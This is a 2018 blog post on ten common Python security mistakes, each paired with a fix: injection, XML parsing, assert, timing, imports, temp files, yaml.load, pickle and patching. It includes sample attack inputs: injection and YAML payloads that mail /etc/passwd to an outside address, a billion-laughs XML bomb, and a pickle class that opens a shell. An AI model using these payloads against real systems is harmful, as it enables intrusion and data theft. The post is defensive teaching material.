blog_heading: 10 common security gotchas in Python and how to avoid them
blog_subheading: A list of common security holes in Python applications, what causes them and how not to make those mistakes.
blog_header_image: posts/danger-snake.jpeg
blog_author: Anthony Shaw
blog_publish_date: June 18, 2018
---
Writing secure code is hard. When you learn a language, a module or a framework, you learn how it __supposed to be use__. When thinking about security, you need to think about __how it can be misused__. Python is no exception, even within the standard library there are documented bad practices for writing hardened applications. Yet, when I’ve spoken to many Python developers they simply aren’t aware of them.

Here are my top 10, __in no particular order__, common gotchas in Python applications.

## 1. Input injection

Injection attacks are broad and really common and there are many types of injection. They impact all languages, frameworks and environments.

**SQL injection** is where you’re writing SQL queries directly instead of using an ORM and mixing your string literals with variables. I’ve read plenty of code where “escaping quotes” is deemed a fix. **It isn’t**. Familiarise yourself with all the complex ways SQL injection can happen with [this cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/).

**Command injection** is anytime you’re calling a process using popen, subprocess, os.system and taking arguments from variables. When calling local commands there’s a possibility of someone setting those values to something malicious.

Imagine this simple script ([credit](https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html)). You call a subprocess with the filename as provided by the user:

```python
import subprocess

def transcode_file(request, filename):
    command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
    subprocess.call(command, shell=True)  # a bad idea!
```

The attacker sets the value of filename to `"; cat /etc/passwd | mail them@domain.com` or something equally dangerous.

### Fix:

Sanitise input using the utilities that come with your web framework, if you’re using one. Unless you have a good reason, don’t construct SQL queries by hand. Most ORMs have builtin sanitization methods.

For the shell, use the `shlex` module to escape input correctly.

## 2. Parsing XML

If your application ever loads and parses XML files, the odds are you are using one of the XML standard library modules. There are a few common attacks through XML. Mostly DoS-style (designed to crash systems instead of exfiltration of data). Those attacks are common, especially if you’re parsing external (ie non-trusted) XML files.

One of those is called “billion laughs”, because of the payload normally containing a lot (billions) of “lols”. Basically, the idea is that you can do referential entities in XML, so when your unassuming XML parser tries to load this XML file into memory it consumes **gigabytes of RAM**. Try it out if you don’t believe me :-)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Another attack uses **external entity expansion**. XML supports referencing entities from external URLs, the XML parser would typically fetch and load that resource without any qualms. “An attacker can circumvent firewalls and gain access to restricted resources as all the requests are made from an internal and trustworthy IP address, not from the outside.”

Another situation to consider is 3rd party packages you’re depending on that decode XML, like configuration files, remote APIs. You might not even be aware that one of your dependencies leaves itself open to these types of attacks.

So what happens in Python? Well, the standard library modules, etree, DOM, xmlrpc are all wide open to these types of attacks. It’s [well documented](https://docs.python.org/3/library/xml.html#xml-vulnerabilities).

### Fix:

Use [`defusedxml`](https://pypi.org/project/defusedxml/) as a drop-in replacement for the standard library modules. It adds safe-guards against these types of attacks.

## 3. Assert statements

Don’t use assert statements to guard against pieces of code that a user shouldn’t access. Take this simple example

```python
def foo(request, user):
   assert user.is_admin, "user does not have access"
   # secure code...
```

Now, by default Python executes with `__debug__` as true, but in a production environment it’s common to run with optimizations. This will **skip the assert statement** and go straight to the secure code regardless of whether the user `is_admin` or not.

### Fix:

Only use assert statements to communicate with other developers, such as in unit tests or in to guard against incorrect API usage.

## 4. Timing attacks

Timing attacks are a way of exposing the behaviour and algorithm by timing how long it takes to compare provided values. Timing attacks require precision, so they don’t typically work over a high-latency remote network. Because of the variable latency involved in most web-applications, it’s pretty much impossible to write a timing attack over HTTP web servers.

But, if you have a command-line application that prompts for the password, an attacker can write a simple script to time how long it takes to compare their value with the actual secret. [Example](http://jyx.github.io/blog/2014/02/02/timing-attack-proof-of-concept/).

There are some impressive examples such as [this SSH-based timing attack](https://github.com/c0r3dump3d/osueta) written in Python if you want to see how they work.

### Fix:

Use `secrets.compare_digest` , introduced in Python 3.5 to compare passwords and other private values.

## 5. A polluted site-packages or import path

Python’s import system is very flexible. Which is great when you’re trying to write monkey-patches for your tests, or overload core functionality.

But, it’s one of the biggest security holes in Python.

Installing 3rd party packages into your site-packages, whether in a virtual environment or the global site-packages (which is generally discouraged) exposes you to security holes in those packages.

There have been occurrences of packages being published to PyPi with similar names to popular packages, but instead executing arbitrary code. The biggest incidence, luckily wasn’t harmful and just “made a point” that the problem is not really being addressed..

Another situation to think about is the dependencies of your dependencies (and so forth). They could include vulnerabilities and they could also override default behaviour in Python via the import system.

### Fix:

Vet your packages. Look [at PyUp.io and their security service](http://pyup.io/). Use virtual environments for all applications and ensure your global site-packages is as clean as possible. Check package signatures.

## 6. Temporary files

To create temporary files in Python, you’d typically generate a file name using `mktemp()` function and then create a file using this name. “This is not secure, because a different process **may create a file** with this name in the time between the call to `mktemp()` and the subsequent attempt to create the file by the first process.” [1](https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables) This means it could trick your application into either loading the wrong data or exposing other temporary data.

Recent versions of Python will raise a runtime warning if you call the incorrect method.

### Fix:
Use the `tempfile` module and use `mkstemp()` if you need to generate temporary files.

## 7. Using yaml.load

To quote the PyYAML documentation:

<blockquote>
“Warning: It is not safe to call yaml.load with any data received from an untrusted source! yaml.load is as powerful as pickle.load and so may call any Python function.”
</blockquote>

This [beautiful example](https://www.talosintelligence.com/reports/TALOS-2017-0305) found in the popular Python project Ansible. You could provide Ansible Vault with this value as the (valid) YAML. It calls `os.system()` with the arguments provided in the file.

```yaml
!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
```

So, effectively loading YAML files from user-provided values leaves you wide-open to attack.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ATY_R6qEa3s?controls=0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Demo of this in action, credit Anthony Sottile

### Fix:

Use `yaml.safe_load()`, pretty much always unless you have a really good reason.

## 8. Pickles

Deserializing pickle data is just as bad as YAML. Python classes can declare a magic-method called `__reduce__` which returns a string, or a tuple with a callable and the arguments to call when pickling. The attacker can use that to include references to one of the subprocess modules to run arbitrary commands on the host.

This [wonderful example](https://blog.nelhage.com/2011/03/exploiting-pickle/) shows how to pickle a class that opens a shell in Python 2. There are plenty [more examples of how to exploit pickle](https://lincolnloop.com/blog/playing-pickle-security/).

```python
import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print base64.b64encode(cPickle.dumps(RunBinSh()))
```

### Fix:

Never unpickle data from an untrusted or unauthenticated source. Use another serialization pattern instead, like JSON.

## 9. Using the system Python runtime and not patching it

Most POSIX systems come with a version of Python 2. Typically an old one.

Since “Python”, ie CPython is written in C, there are times when the Python interpreter itself has holes. Common security issues in C are related to the allocation of memory, so buffer overflow errors.

CPython has had a number of overrun or overflow vulnerabilities over the years, each of which have been patched and fixed in subsequent releases.

So you’re safe. That is, **if you patch your runtime**.

Here’s [an example from 2.7.13 and below](https://www.cvedetails.com/cve/CVE-2017-1000158/), an integer overflow vulnerability that enables code execution. [That’s pretty much](https://distrowatch.com/table.php?distribution=ubuntu) any un-patched version of Ubuntu pre-17.

### Fix:

Install the latest version of Python for your production applications, and patch it!

## 10. Not patching your dependencies

Similar to not patching your runtime, you also need to patch your dependencies regularly.

I find the practice of “pinning” versions of Python packages from PyPi in packages terrifying. The idea is that “these are the versions that work” so everyone leaves it alone.

All of the vulnerabilities in code I’ve mentioned above are just as important when they exist in packages that your application uses. Developers of those packages fix security issues. All the time.

### Fix:
Use a service like PyUp.io to check for updates, raise pull/merge requests to your application and run your tests to keep the packages up to date.
Use a tool like InSpec to [validate the installed versions on production environments](https://www.inspec.io/docs/reference/resources/pip/) and ensure minimal versions or version ranges are patched.

## Have you tried Bandit?

There’s a great static linter that will catch all of these issues in your code, and more!

It’s called bandit, just `pip install bandit` and `bandit ./codedir`
PyCQA/bandit

## Check out my PyCharm plugin!

Since writing this article, I've developed a plugin for PyCharm that warns and corrects your code for all of the issues raised in this article. (plus over 30 more)

It is,

* Available as a PyCharm plugin on the [Jetbrains plugin marketplace](https://plugins.jetbrains.com/plugin/13609-python-security)
* Available as a GitHub Action for your CI/CD workflow [on the GitHub Marketplace](https://github.com/marketplace/actions/pycharm-python-security-scanner).
* Available as a standalone container image [on the Docker Hub](https://hub.docker.com/r/anthonypjshaw/pycharm-security)

Documentation is available on [pycharm-security.readthedocs.io](https://pycharm-security.readthedocs.io/en/latest/?badge=latest), including examples and explanations for all the checks.

Documentation for the GitHub action is [on the documentation site](https://pycharm-security.readthedocs.io/en/latest/github.html).

### Credits

Credit to RedHat for [this great article](https://access.redhat.com/blogs/766093/posts/2592591) that I used in some of my research.